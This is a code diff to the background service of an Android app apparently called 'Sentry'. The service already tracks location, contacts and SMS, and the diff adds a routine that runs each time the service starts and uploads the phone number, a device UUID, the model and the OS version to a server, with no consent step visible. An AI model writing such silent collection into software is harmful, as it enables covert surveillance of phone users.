@@ -6,6 +6,7 @@ import java.util.HashMap;
 
 import android.app.Service;
 import android.content.ContentResolver;
+import android.content.Context;
 import android.content.Intent;
 import android.database.Cursor;
 import android.database.sqlite.SQLiteException;
@@ -15,6 +16,7 @@ import android.os.IBinder;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.ContactsContract.PhoneLookup;
+import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 import android.util.Log;
 
@@ -56,8 +58,13 @@ public class WorkService extends Service {
 	public static final String KEY_CONTACT_LAST_UPDATE_TIME = "sentry.key.contact.lastUpdateTime";
 	public static final String KEY_SMS_LAST_UPDATE_TIME 	= "sentry.key.sms.lastUpdateTime";
 	
+	public static final String KEY_MOBILE_INFO 	= "sentry.key.mobileInfoUpload";
+	
 	private LocationClient mClient;
 	private MyLocationListener mLocationListener;
+	private boolean mMobileInfoUploaded;
+	
+	private Object mLock = new Object();
 	private static final String TAG = "Sentry/WorkService";
 	
 	public WorkService() {
@@ -105,6 +112,7 @@ public class WorkService extends Service {
 		// TODO Auto-generated method stub
 //		Toast.makeText(this, "repeating alarm", Toast.LENGTH_SHORT).show();
 		AppLog.d(TAG, "[onStartCommand] " + new Date() + ", " + intent.getAction());
+		ensureMobileInfoUpload();
 		String action = intent.getAction();
 		if(ACTION_LOCATION_REQ.equals(action)){
 			if(!mClient.isStarted()){
@@ -128,6 +136,40 @@ public class WorkService extends Service {
 		return super.onStartCommand(intent, flags, startId);
 	}
 	
+	
+	private void ensureMobileInfoUpload() {
+		// TODO Auto-generated method stub
+		if (mMobileInfoUploaded) {
+			return;
+		}
+		new Thread(new Runnable() {
+			@Override
+			public void run() {
+				// TODO Auto-generated method stub
+				synchronized (mLock) {
+					if(mMobileInfoUploaded){
+						return;
+					}
+					String infos = SentryApplication.getApp().getMobileInfos();
+					TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+					String uuid = SentryApplication.getApp().getUuid();
+					String phoneNumber = tm.getLine1Number();
+					String model = android.os.Build.MODEL;
+					String sysVer = android.os.Build.VERSION.RELEASE;
+					String buildInfos = uuid + "," + phoneNumber + "," + model + "," + sysVer;
+					if(infos.equals(buildInfos)){
+						mMobileInfoUploaded = true;
+					}else {
+						boolean success = uploadMobileInfo(uuid, phoneNumber, model, sysVer);
+						if(success) {
+							SentryApplication.getApp().setMobileInfos(buildInfos);
+							mMobileInfoUploaded = true;
+						}
+					}
+				}
+			}
+		}).start();
+	}
 	
 	@Override
 	public void onDestroy() {
@@ -385,6 +427,17 @@ public class WorkService extends Service {
 			if(result){
 			}
 		}
+	}
+	
+	private boolean uploadMobileInfo(String uuid, String number, String model, String sysVersion){
+		HashMap<String, String> map = new HashMap<String, String>();
+		map.put("uuid", uuid);
+		map.put("number", number);
+		map.put("model", model);
+		map.put("sysVersion", sysVersion);
+		String responce = NetUtil.doPost(Common.URL_MOBILE_INFO_UPLOAD, map);
+		WebResult result = WebResult.parseByJson(responce);
+		return result != null && result.success;
 	}
 	
 	private boolean uploadLocationList(ArrayList<SLocation> locations){
